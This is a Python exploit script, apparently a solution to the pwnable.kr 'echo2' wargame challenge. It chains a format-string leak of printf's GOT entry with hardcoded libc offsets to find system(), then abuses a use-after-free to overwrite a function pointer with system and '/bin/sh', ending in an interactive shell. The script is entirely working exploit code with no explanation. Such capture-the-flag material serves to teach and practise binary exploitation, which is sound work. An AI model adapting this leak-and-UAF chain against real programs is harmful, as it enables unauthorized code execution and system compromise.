from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './echo2'
#target  = ('pwnable.kr', 9011)
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x400864, 0x400886])
#io.gdb_hint([0x400887])

io.read_until("hey, what's your name? :")
io.writeline('B' * 24)

def fsb(payload):
    io.read_until('> ')
    io.writeline('2')
    io.readline()
    io.writeline(payload)

def uaf(payload):
    io.read_until('> ')
    io.writeline('3')
    io.readline()
    io.writeline(payload)

def freeo():
    io.read_until('> ')
    io.writeline('4')
    io.read_until('Are you sure you want to exit? (y/n)')
    io.writeline('n')

got_printf  =   0x602010 + 1
payload0    =   "%7$s".ljust(8, 'A')
payload0    +=  l64(got_printf)

fsb(payload0)

adr_printf  = l64(('\x00' + io.read(5)).ljust(8, '\x00'))
off_printf  = 0x0000000000051000
off_system  = 0x00000000000438e0

off_printf  = 0x0000000000054400
off_system  = 0x0000000000046640
libc_base   = adr_printf - off_printf
adr_system  = off_system + libc_base

print hex(adr_system)

freeo()
payload1    =   '/bin/sh\x00'.ljust(0x18, 'A')
payload1    +=  l64(adr_system)
payload1    +=  'A' * 8
uaf(payload1)
uaf(payload1)

io.interact()

